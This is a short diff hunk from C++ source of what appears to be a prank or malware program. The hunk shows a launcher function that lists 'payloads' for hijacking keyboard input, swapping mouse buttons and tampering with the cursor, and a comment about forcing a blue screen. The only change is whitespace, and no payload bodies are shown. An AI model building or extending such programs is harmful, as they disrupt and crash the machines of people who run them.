@@ -166,7 +166,7 @@ void PayloadInvert(void) {
 //  DONE bsod at end
 void LaunchPayloads(void)
 {
-	std::array<std::function<void(void)>, 6> payloads = {
+	std::array<std::function<void(void)>, 6	> payloads = {
 			PayloadKeyboardInput,
 			PayloadSwapMouseButtons,
 			PayloadCursor,
